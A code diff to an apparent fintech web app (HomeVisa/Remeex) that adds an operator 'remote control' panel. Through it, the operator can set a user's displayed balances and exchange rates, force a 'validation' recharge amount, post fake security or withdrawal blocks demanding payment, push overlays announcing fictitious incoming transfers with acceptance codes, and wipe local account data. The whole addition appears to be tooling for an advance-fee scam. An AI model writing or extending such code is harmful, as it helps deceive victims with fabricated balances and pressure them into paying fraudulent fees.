@@ -43,6 +43,104 @@
     eur: '€'
   };
 
+  const ACCOUNT_STORAGE_KEYS = [
+    'visaRegistrationCompleted',
+    'visaRegistrationTemp',
+    'visaUserData',
+    'remeexVerificationData',
+    'remeexVerificationBanking',
+    'remeexIdentityDetails',
+    'remeexIdentityDocuments',
+    'remeexProfilePhoto',
+    'remeexDeviceId',
+    'remeexBalance',
+    'remeexTransactions',
+    'remeexBalanceHistory',
+    'remeexBalanceTimeline',
+    'remeexBalanceSnapshots',
+    'remeexBalanceLog',
+    'remeexAccountTier',
+    'remeexPoints',
+    'selectedRate',
+    'selectedRateValue',
+    'selectedRateUsdToEur',
+    'selectedLatamCountry',
+    'userFullName',
+    'remeexSessionExchangeRate',
+    'homevisaSessionMonitor',
+    'forcedValidationAmountUsd',
+    'validationDiscount',
+    'pendingCommission',
+    'discountExpiry',
+    'discountUsed'
+  ];
+
+  const REMOTE_COMMAND_KEY = 'homevisaRemoteCommands';
+  const REMOTE_PROCESSED_KEY = 'homevisaRemoteProcessed';
+  const REMOTE_BLOCK_STATE_KEY = 'homevisaManualBlockState';
+  const REMOTE_MAX_COMMANDS = 50;
+
+  const REMOTE_ACTION_LABELS = {
+    'update-balance': 'Actualización de saldo',
+    'set-block': 'Actualización de bloqueo',
+    'wipe-account': 'Eliminación de cuenta local',
+    'update-rate': 'Actualización de tasa',
+    'set-validation-amount': 'Monto de validación',
+    'show-overlay': 'Overlay remoto',
+    'hide-overlay': 'Ocultar overlay'
+  };
+
+  const BLOCK_PRESETS = {
+    general: {
+      label: 'Bloqueo general',
+      message: 'Tu cuenta está bloqueada temporalmente por revisión manual. Contacta a soporte para reactivarla.',
+      accent: '#f87171'
+    },
+    validation: {
+      label: 'Validación pendiente',
+      message: 'Debes completar la validación con una recarga supervisada para reactivar todas las funciones.',
+      accent: '#f97316'
+    },
+    security: {
+      label: 'Alerta de seguridad',
+      message: 'Detectamos actividad inusual y bloqueamos tu cuenta para proteger tus fondos. Comunícate con soporte.',
+      accent: '#f87171'
+    },
+    payments: {
+      label: 'Bloqueo de pagos',
+      message: 'Los pagos están temporalmente limitados mientras revisamos tus operaciones recientes.',
+      accent: '#facc15'
+    },
+    withdrawals: {
+      label: 'Bloqueo de retiros',
+      message: 'Los retiros se habilitarán una vez completes la validación adicional solicitada.',
+      accent: '#facc15'
+    }
+  };
+
+  const OVERLAY_TEMPLATES = {
+    donation: {
+      title: 'Multiplica tu impacto',
+      message: 'Tu saldo puede transformar vidas. Dona a nuestros aliados solidarios con un clic.',
+      accent: '#f97316',
+      button: { label: 'Donar ahora', href: 'servicios.html#donaciones' }
+    },
+    activation: {
+      title: 'Activa tu cuenta hoy',
+      message: 'Completa la validación para desbloquear retiros, pagos y transferencias ilimitadas.',
+      accent: '#38bdf8',
+      button: { label: 'Ver requisitos', href: '#validacion' }
+    },
+    transfer: {
+      title: 'Transferencia pendiente',
+      message: 'Has recibido fondos que necesitan tu confirmación. Ingresa el código enviado para liberarlos.',
+      accent: '#22d3ee',
+      button: { label: 'Aceptar transferencia', href: '#transferencias' }
+    }
+  };
+
+  let remoteFeedbackTimeout = null;
+
   const REGISTRATION_SNAPSHOT_DESCRIPTORS = [
     { key: 'visaRegistrationCompleted', label: 'Registro completado', storage: 'localStorage' },
     { key: 'visaRegistrationTemp', label: 'Registro temporal (localStorage)', storage: 'localStorage' },
@@ -200,6 +298,552 @@
       }
     }
     return null;
+  }
+
+  function loadRemoteCommands() {
+    const stored = safeJSONParse(localStorage.getItem(REMOTE_COMMAND_KEY));
+    return Array.isArray(stored) ? stored : [];
+  }
+
+  function saveRemoteCommands(commands) {
+    try {
+      localStorage.setItem(REMOTE_COMMAND_KEY, JSON.stringify(commands));
+    } catch (error) {
+      console.warn('[MiInformación] No se pudo guardar la cola remota.', error);
+    }
+  }
+
+  function loadProcessedCommandIds() {
+    const stored = safeJSONParse(localStorage.getItem(REMOTE_PROCESSED_KEY));
+    if (!Array.isArray(stored)) return [];
+    return stored.filter((id) => typeof id === 'string');
+  }
+
+  function loadRemoteBlockState() {
+    const stored = safeJSONParse(localStorage.getItem(REMOTE_BLOCK_STATE_KEY));
+    if (!stored || typeof stored !== 'object') return null;
+    return {
+      active: stored.active !== false,
+      type: stored.type || 'general',
+      message: stored.message || '',
+      title: stored.title || '',
+      accent: stored.accent || ''
+    };
+  }
+
+  function enqueueRemoteCommand(type, payload = {}, meta = {}) {
+    const commands = loadRemoteCommands();
+    const processedSet = new Set(loadProcessedCommandIds());
+    const id = `cmd-${Date.now()}-${Math.random().toString(16).slice(2, 8)}`;
+    const createdAt = new Date().toISOString();
+    const command = {
+      id,
+      type,
+      payload,
+      meta: Object.assign({ source: 'miinformacion', createdAt }, meta),
+      createdAt
+    };
+    commands.push(command);
+    const filtered = commands.filter((item) => !processedSet.has(item.id));
+    while (filtered.length > REMOTE_MAX_COMMANDS) {
+      filtered.shift();
+    }
+    saveRemoteCommands(filtered);
+    refreshRemoteControlPanel();
+    return command;
+  }
+
+  function showRemoteFeedback(message, type = 'info') {
+    const container = document.getElementById('remote-feedback');
+    if (!container) return;
+    container.textContent = message;
+    if (type === 'info') {
+      delete container.dataset.type;
+    } else {
+      container.dataset.type = type;
+    }
+    if (remoteFeedbackTimeout) {
+      clearTimeout(remoteFeedbackTimeout);
+    }
+    remoteFeedbackTimeout = setTimeout(() => {
+      if (!container) return;
+      container.textContent = '';
+      delete container.dataset.type;
+    }, 5000);
+  }
+
+  function updateBlockMessagePlaceholder() {
+    const select = document.getElementById('remote-block-type');
+    const textarea = document.getElementById('remote-block-message');
+    if (!select || !textarea) return;
+    if (textarea.value && textarea.value.trim()) return;
+    const preset = BLOCK_PRESETS[select.value] || BLOCK_PRESETS.general;
+    if (preset && preset.message) {
+      textarea.placeholder = preset.message;
+    }
+  }
+
+  function getTransferDetails() {
+    const senderInput = document.getElementById('remote-transfer-sender');
+    const amountInput = document.getElementById('remote-transfer-amount');
+    const currencySelect = document.getElementById('remote-transfer-currency');
+    const codeInput = document.getElementById('remote-transfer-code');
+    const sender = senderInput && senderInput.value.trim() ? senderInput.value.trim() : "Patrick D'Lavangart";
+    const amount = toNumber(amountInput ? amountInput.value : null);
+    const currency = currencySelect && currencySelect.value ? currencySelect.value : 'USD';
+    const code = codeInput && codeInput.value.trim() ? codeInput.value.trim() : 'EV-4591';
+    return { sender, amount, currency, code };
+  }
+
+  function collectOverlayOverrides() {
+    const overrides = {};
+    const titleInput = document.getElementById('remote-overlay-title');
+    const messageInput = document.getElementById('remote-overlay-message');
+    const accentInput = document.getElementById('remote-overlay-accent');
+    const buttonLabelInput = document.getElementById('remote-overlay-action-label');
+    const buttonUrlInput = document.getElementById('remote-overlay-action-url');
+
+    if (titleInput && titleInput.value.trim()) {
+      overrides.title = titleInput.value.trim();
+    }
+    if (messageInput && messageInput.value.trim()) {
+      overrides.message = messageInput.value.trim();
+    }
+    if (accentInput && accentInput.value.trim()) {
+      overrides.accent = accentInput.value.trim();
+    }
+    if (buttonLabelInput && buttonLabelInput.value.trim()) {
+      overrides.buttonLabel = buttonLabelInput.value.trim();
+    }
+    if (buttonUrlInput && buttonUrlInput.value.trim()) {
+      overrides.buttonUrl = buttonUrlInput.value.trim();
+    }
+
+    return overrides;
+  }
+
+  function buildOverlayPayload(template, overrides = {}) {
+    const base = OVERLAY_TEMPLATES[template] || {};
+    const payload = Object.assign({}, base);
+    const accent = overrides.accent || base.accent;
+
+    if (overrides.title) {
+      payload.title = overrides.title;
+    }
+    if (overrides.message) {
+      payload.message = overrides.message;
+    }
+    if (accent) {
+      payload.accent = accent;
+    }
+
+    if (overrides.buttonLabel || overrides.buttonUrl) {
+      payload.button = {
+        label: overrides.buttonLabel || (base.button ? base.button.label : 'Ver más'),
+        href: overrides.buttonUrl || (base.button ? base.button.href : '#')
+      };
+    } else if (base.button) {
+      payload.button = Object.assign({}, base.button);
+    }
+
+    if (template === 'activation') {
+      const forced = toNumber(localStorage.getItem('forcedValidationAmountUsd'));
+      if (!overrides.message) {
+        const fallbackAmount = Number.isFinite(forced) ? forced : 25;
+        const formattedAmount = formatNumber(fallbackAmount, {
+          minimumFractionDigits: 2,
+          maximumFractionDigits: 2
+        });
+        payload.message = `Completa tu validación con una recarga controlada de $${formattedAmount} para desbloquear retiros, pagos y transferencias.`;
+      }
+      payload.meta = Object.assign({}, payload.meta, {
+        validationAmount: Number.isFinite(forced) ? forced : null
+      });
+    }
+
+    if (template === 'transfer') {
+      const details = getTransferDetails();
+      const symbol = details.currency === 'VES' ? 'Bs' : details.currency === 'EUR' ? '€' : '$';
+      const amountLabel = Number.isFinite(details.amount)
+        ? `${symbol} ${formatNumber(details.amount)}`
+        : `${symbol} ${formatNumber(0)}`;
+      if (!overrides.title) {
+        payload.title = `Transferencia de ${details.sender}`;
+      }
+      if (!overrides.message) {
+        payload.message = `Has recibido ${amountLabel} de ${details.sender}. Usa el código ${details.code} para aceptarlo en HomeVisa.`;
+      }
+      payload.meta = Object.assign({}, payload.meta, details);
+      if (!payload.button) {
+        payload.button = { label: 'Aceptar transferencia', href: '#transferencias' };
+      }
+    }
+
+    payload.template = template;
+    payload.timestamp = new Date().toISOString();
+    return payload;
+  }
+
+  function renderRemoteControlPanel(context = {}) {
+    const statusBadge = document.getElementById('remote-actions-status');
+    const blockStatus = document.getElementById('remote-block-status');
+    const logContainer = document.getElementById('remote-actions-log');
+    const balance = context.balance || loadBalance();
+    const rate = context.rate || getRateInfo();
+    const commands = Array.isArray(context.commands) ? context.commands : loadRemoteCommands();
+    const processedIds = new Set(Array.isArray(context.processed) ? context.processed : loadProcessedCommandIds());
+    const blockState = context.blockState || loadRemoteBlockState();
+    const validationAmount = context.validationAmount !== undefined
+      ? context.validationAmount
+      : toNumber(localStorage.getItem('forcedValidationAmountUsd'));
+
+    if (statusBadge) {
+      const pending = commands.filter((cmd) => !processedIds.has(cmd.id));
+      statusBadge.textContent = pending.length ? `${pending.length} pendientes` : 'Sin acciones';
+      statusBadge.classList.toggle('is-active', pending.length > 0);
+    }
+
+    if (blockStatus) {
+      if (blockState && blockState.active) {
+        const preset = BLOCK_PRESETS[blockState.type] || BLOCK_PRESETS.general;
+        const label = preset ? preset.label : 'Bloqueo remoto';
+        const description = blockState.message || preset.message;
+        blockStatus.innerHTML = `<strong>${label}:</strong> ${description}`;
+      } else {
+        blockStatus.textContent = 'Sin bloqueos manuales activos.';
+      }
+    }
+
+    const blockTypeSelect = document.getElementById('remote-block-type');
+    if (blockTypeSelect && blockState && blockState.type) {
+      blockTypeSelect.value = blockState.type;
+    }
+    const blockMessageInput = document.getElementById('remote-block-message');
+    if (blockMessageInput && (!blockMessageInput.value || !blockMessageInput.value.trim())) {
+      const currentType = blockTypeSelect && blockTypeSelect.value ? blockTypeSelect.value : (blockState && blockState.type) || 'general';
+      const preset = BLOCK_PRESETS[currentType] || BLOCK_PRESETS.general;
+      blockMessageInput.placeholder = preset.message;
+    }
+
+    const balanceFields = [
+      { id: 'remote-balance-bs', value: balance && Number.isFinite(balance.bs) ? balance.bs : null, currency: 'ves' },
+      { id: 'remote-balance-usd', value: balance && Number.isFinite(balance.usd) ? balance.usd : null, currency: 'usd' },
+      { id: 'remote-balance-eur', value: balance && Number.isFinite(balance.eur) ? balance.eur : null, currency: 'eur' },
+      { id: 'remote-balance-usdt', value: balance && Number.isFinite(balance.usdt) ? balance.usdt : null, currency: null }
+    ];
+    balanceFields.forEach((field) => {
+      const input = document.getElementById(field.id);
+      if (!input || (input.value && input.value.trim())) return;
+      if (field.currency === null) {
+        input.placeholder = Number.isFinite(field.value)
+          ? formatNumber(field.value, { minimumFractionDigits: 2, maximumFractionDigits: 2 })
+          : '0.00';
+      } else {
+        input.placeholder = Number.isFinite(field.value)
+          ? formatCurrency(field.value, field.currency)
+          : field.currency === 'ves'
+            ? '0,00'
+            : '0.00';
+      }
+    });
+
+    const rateSelect = document.getElementById('remote-rate-key');
+    if (rateSelect && rate && rate.key) {
+      rateSelect.value = rate.key;
+    }
+    const rateValueInput = document.getElementById('remote-rate-value');
+    if (rateValueInput && (!rateValueInput.value || !rateValueInput.value.trim())) {
+      rateValueInput.placeholder = Number.isFinite(rate?.value)
+        ? formatNumber(rate.value, { minimumFractionDigits: 2, maximumFractionDigits: 4 })
+        : '37,50';
+    }
+    const rateEurInput = document.getElementById('remote-rate-eur');
+    if (rateEurInput && (!rateEurInput.value || !rateEurInput.value.trim())) {
+      rateEurInput.placeholder = Number.isFinite(rate?.usdToEur)
+        ? formatNumber(rate.usdToEur, { minimumFractionDigits: 2, maximumFractionDigits: 4 })
+        : '0.93';
+    }
+
+    const validationInput = document.getElementById('remote-validation-amount');
+    if (validationInput && (!validationInput.value || !validationInput.value.trim())) {
+      validationInput.placeholder = Number.isFinite(validationAmount)
+        ? formatNumber(validationAmount, { minimumFractionDigits: 2, maximumFractionDigits: 2 })
+        : '25.00';
+    }
+
+    if (logContainer) {
+      logContainer.innerHTML = '';
+      const recent = commands.slice(-6).reverse();
+      if (recent.length === 0) {
+        const empty = document.createElement('div');
+        empty.className = 'remote-log-empty';
+        empty.textContent = 'No hay acciones registradas recientemente.';
+        logContainer.appendChild(empty);
+      } else {
+        recent.forEach((cmd) => {
+          const item = document.createElement('div');
+          item.className = 'remote-log-item';
+          const label = document.createElement('span');
+          label.className = 'remote-log-label';
+          label.textContent = REMOTE_ACTION_LABELS[cmd.type] || cmd.type;
+          const time = document.createElement('span');
+          time.className = 'remote-log-time';
+          time.textContent = formatTimestamp(cmd.createdAt || cmd.timestamp || Date.now());
+          item.appendChild(label);
+          item.appendChild(time);
+          logContainer.appendChild(item);
+        });
+      }
+    }
+  }
+
+  function refreshRemoteControlPanel() {
+    renderRemoteControlPanel({
+      balance: loadBalance(),
+      rate: getRateInfo(),
+      commands: loadRemoteCommands(),
+      processed: loadProcessedCommandIds(),
+      blockState: loadRemoteBlockState(),
+      validationAmount: toNumber(localStorage.getItem('forcedValidationAmountUsd'))
+    });
+  }
+
+  function populateBalanceInputs() {
+    const balance = loadBalance();
+    if (!balance || typeof balance !== 'object') {
+      showRemoteFeedback('No se encontró un saldo almacenado en este dispositivo.', 'error');
+      return;
+    }
+    const bsInput = document.getElementById('remote-balance-bs');
+    const usdInput = document.getElementById('remote-balance-usd');
+    const eurInput = document.getElementById('remote-balance-eur');
+    const usdtInput = document.getElementById('remote-balance-usdt');
+    if (bsInput) bsInput.value = Number.isFinite(balance.bs) ? formatNumber(balance.bs) : '';
+    if (usdInput) usdInput.value = Number.isFinite(balance.usd) ? formatNumber(balance.usd) : '';
+    if (eurInput) eurInput.value = Number.isFinite(balance.eur) ? formatNumber(balance.eur) : '';
+    if (usdtInput) usdtInput.value = Number.isFinite(balance.usdt) ? formatNumber(balance.usdt, { minimumFractionDigits: 2, maximumFractionDigits: 2 }) : '';
+    showRemoteFeedback('Saldo actual cargado en el panel.', 'success');
+  }
+
+  function handleRemoteBalanceSubmit(event) {
+    event.preventDefault();
+    const payload = {};
+    const bsInput = document.getElementById('remote-balance-bs');
+    const usdInput = document.getElementById('remote-balance-usd');
+    const eurInput = document.getElementById('remote-balance-eur');
+    const usdtInput = document.getElementById('remote-balance-usdt');
+
+    const bsValue = toNumber(bsInput ? bsInput.value : null);
+    const usdValue = toNumber(usdInput ? usdInput.value : null);
+    const eurValue = toNumber(eurInput ? eurInput.value : null);
+    const usdtValue = toNumber(usdtInput ? usdtInput.value : null);
+
+    if (Number.isFinite(bsValue)) payload.bs = bsValue;
+    if (Number.isFinite(usdValue)) payload.usd = usdValue;
+    if (Number.isFinite(eurValue)) payload.eur = eurValue;
+    if (Number.isFinite(usdtValue)) payload.usdt = usdtValue;
+
+    if (!Object.keys(payload).length) {
+      showRemoteFeedback('Introduce al menos un monto válido para actualizar el saldo.', 'error');
+      return;
+    }
+
+    payload.timestamp = new Date().toISOString();
+    enqueueRemoteCommand('update-balance', payload, { description: 'Actualización manual desde Mi Información' });
+    showRemoteFeedback('Actualización de saldo enviada a HomeVisa.', 'success');
+    event.target.reset();
+    refreshRemoteControlPanel();
+  }
+
+  function handleRemoteRateSubmit(event) {
+    event.preventDefault();
+    const select = document.getElementById('remote-rate-key');
+    const valueInput = document.getElementById('remote-rate-value');
+    const eurInput = document.getElementById('remote-rate-eur');
+    const key = select && select.value ? select.value : 'personalizado';
+    const value = toNumber(valueInput ? valueInput.value : null);
+    const usdToEur = toNumber(eurInput ? eurInput.value : null);
+    const payload = { key, label: RATE_LABELS[key] || key };
+
+    if (Number.isFinite(value)) {
+      payload.value = value;
+    }
+    if (Number.isFinite(usdToEur)) {
+      payload.usdToEur = usdToEur;
+    }
+
+    enqueueRemoteCommand('update-rate', payload, { type: key });
+    showRemoteFeedback('Tasa enviada a HomeVisa.', 'success');
+    event.target.reset();
+    refreshRemoteControlPanel();
+  }
+
+  function handleRemoteValidationSubmit(event) {
+    event.preventDefault();
+    const input = document.getElementById('remote-validation-amount');
+    if (!input) return;
+    const raw = input.value.trim();
+    if (!raw) {
+      enqueueRemoteCommand('set-validation-amount', { amount: null }, { action: 'clear' });
+      showRemoteFeedback('Se solicitó restablecer el monto de validación.', 'success');
+      return;
+    }
+    const amount = toNumber(raw);
+    if (!Number.isFinite(amount) || amount <= 0) {
+      showRemoteFeedback('Introduce un monto de validación válido en USD.', 'error');
+      return;
+    }
+    enqueueRemoteCommand('set-validation-amount', { amount }, { action: 'set' });
+    showRemoteFeedback('Monto de validación enviado a HomeVisa.', 'success');
+    event.target.reset();
+    refreshRemoteControlPanel();
+  }
+
+  function handleRemoteOverlay(template) {
+    const overrides = collectOverlayOverrides();
+    const payload = buildOverlayPayload(template, overrides);
+    enqueueRemoteCommand('show-overlay', payload, { template });
+    showRemoteFeedback('Overlay enviado a HomeVisa.', 'success');
+  }
+
+  function handleRemoteOverlayHide() {
+    enqueueRemoteCommand('hide-overlay', {}, { template: 'hide' });
+    showRemoteFeedback('Se solicitó ocultar el overlay remoto.', 'success');
+  }
+
+  function handleRemoteBlockActivation() {
+    const select = document.getElementById('remote-block-type');
+    const textarea = document.getElementById('remote-block-message');
+    const type = select && select.value ? select.value : 'general';
+    const preset = BLOCK_PRESETS[type] || BLOCK_PRESETS.general;
+    const message = textarea && textarea.value.trim() ? textarea.value.trim() : preset.message;
+    const payload = {
+      active: true,
+      type,
+      message,
+      title: preset.label,
+      accent: preset.accent
+    };
+    enqueueRemoteCommand('set-block', payload, { type });
+    showRemoteFeedback('Bloqueo activado en HomeVisa.', 'success');
+  }
+
+  function handleRemoteBlockDeactivation() {
+    enqueueRemoteCommand('set-block', { active: false }, { type: 'clear' });
+    showRemoteFeedback('Se solicitó eliminar el bloqueo remoto.', 'success');
+  }
+
+  function handleRemoteAccountDeletion() {
+    const confirmed = typeof window.confirm === 'function'
+      ? window.confirm('¿Eliminar todos los datos locales almacenados en HomeVisa? Esta acción se reflejará en la otra pestaña.')
+      : true;
+    if (!confirmed) return;
+    enqueueRemoteCommand('wipe-account', { keys: ACCOUNT_STORAGE_KEYS.slice() }, { action: 'wipe' });
+    showRemoteFeedback('Se solicitó eliminar la cuenta local en HomeVisa.', 'success');
+  }
+
+  function initRemoteControls() {
+    const balanceForm = document.getElementById('remote-balance-form');
+    if (balanceForm) {
+      balanceForm.addEventListener('submit', handleRemoteBalanceSubmit);
+    }
+    const balanceSync = document.getElementById('remote-balance-sync');
+    if (balanceSync) {
+      balanceSync.addEventListener('click', function (event) {
+        event.preventDefault();
+        populateBalanceInputs();
+      });
+    }
+
+    const rateForm = document.getElementById('remote-rate-form');
+    if (rateForm) {
+      rateForm.addEventListener('submit', handleRemoteRateSubmit);
+    }
+
+    const validationForm = document.getElementById('remote-validation-form');
+    if (validationForm) {
+      validationForm.addEventListener('submit', handleRemoteValidationSubmit);
+    }
+
+    const validationClear = document.getElementById('remote-validation-clear');
+    if (validationClear) {
+      validationClear.addEventListener('click', function (event) {
+        event.preventDefault();
+        enqueueRemoteCommand('set-validation-amount', { amount: null }, { action: 'clear' });
+        showRemoteFeedback('Se solicitó restablecer el monto de validación.', 'success');
+        const input = document.getElementById('remote-validation-amount');
+        if (input) {
+          input.value = '';
+        }
+        refreshRemoteControlPanel();
+      });
+    }
+
+    const overlayDonation = document.getElementById('remote-overlay-donation');
+    if (overlayDonation) {
+      overlayDonation.addEventListener('click', function (event) {
+        event.preventDefault();
+        handleRemoteOverlay('donation');
+      });
+    }
+
+    const overlayActivation = document.getElementById('remote-overlay-activation');
+    if (overlayActivation) {
+      overlayActivation.addEventListener('click', function (event) {
+        event.preventDefault();
+        handleRemoteOverlay('activation');
+      });
+    }
+
+    const overlayTransfer = document.getElementById('remote-overlay-transfer');
+    if (overlayTransfer) {
+      overlayTransfer.addEventListener('click', function (event) {
+        event.preventDefault();
+        handleRemoteOverlay('transfer');
+      });
+    }
+
+    const overlayHide = document.getElementById('remote-overlay-hide');
+    if (overlayHide) {
+      overlayHide.addEventListener('click', function (event) {
+        event.preventDefault();
+        handleRemoteOverlayHide();
+      });
+    }
+
+    const blockActivate = document.getElementById('remote-block-activate');
+    if (blockActivate) {
+      blockActivate.addEventListener('click', function (event) {
+        event.preventDefault();
+        handleRemoteBlockActivation();
+      });
+    }
+
+    const blockDeactivate = document.getElementById('remote-block-deactivate');
+    if (blockDeactivate) {
+      blockDeactivate.addEventListener('click', function (event) {
+        event.preventDefault();
+        handleRemoteBlockDeactivation();
+      });
+    }
+
+    const deleteAccountBtn = document.getElementById('remote-delete-account');
+    if (deleteAccountBtn) {
+      deleteAccountBtn.addEventListener('click', function (event) {
+        event.preventDefault();
+        handleRemoteAccountDeletion();
+      });
+    }
+
+    const blockTypeSelect = document.getElementById('remote-block-type');
+    if (blockTypeSelect) {
+      blockTypeSelect.addEventListener('change', function () {
+        updateBlockMessagePlaceholder();
+      });
+      updateBlockMessagePlaceholder();
+    }
+
+    refreshRemoteControlPanel();
   }
 
   function parseTimestampValue(value) {
@@ -1797,6 +2441,14 @@
     renderBalanceHistory(history);
     renderSessionMonitor(sessionMonitor);
     renderTransactions(transactions);
+    renderRemoteControlPanel({
+      balance,
+      rate,
+      commands: loadRemoteCommands(),
+      processed: loadProcessedCommandIds(),
+      blockState: loadRemoteBlockState(),
+      validationAmount: toNumber(localStorage.getItem('forcedValidationAmountUsd'))
+    });
   }
 
   let refreshTimeout = null;
@@ -1809,6 +2461,7 @@
   }
 
   document.addEventListener('DOMContentLoaded', function () {
+    initRemoteControls();
     refreshAll();
     setInterval(refreshAll, 60000);
   });
@@ -1817,37 +2470,13 @@
     scheduleRefresh();
   });
 
-  const watchedKeys = new Set([
-    'visaRegistrationCompleted',
-    'visaRegistrationTemp',
-    'visaUserData',
-    'remeexVerificationData',
-    'remeexVerificationBanking',
-    'remeexIdentityDetails',
-    'remeexIdentityDocuments',
-    'remeexProfilePhoto',
-    'remeexDeviceId',
-    'remeexBalance',
-    'remeexTransactions',
-    'remeexBalanceHistory',
-    'remeexBalanceTimeline',
-    'remeexBalanceSnapshots',
-    'remeexBalanceLog',
-    'remeexAccountTier',
-    'remeexPoints',
-    'selectedRate',
-    'selectedRateValue',
-    'selectedRateUsdToEur',
-    'selectedLatamCountry',
-    'userFullName',
-    'remeexSessionExchangeRate',
-    'homevisaSessionMonitor',
-    'forcedValidationAmountUsd',
-    'validationDiscount',
-    'pendingCommission',
-    'discountExpiry',
-    'discountUsed'
-  ]);
+  const watchedKeys = new Set(
+    ACCOUNT_STORAGE_KEYS.concat([
+      REMOTE_COMMAND_KEY,
+      REMOTE_PROCESSED_KEY,
+      REMOTE_BLOCK_STATE_KEY
+    ])
+  );
 
   const originalSetItem = localStorage.setItem.bind(localStorage);
   localStorage.setItem = function (key, value) {
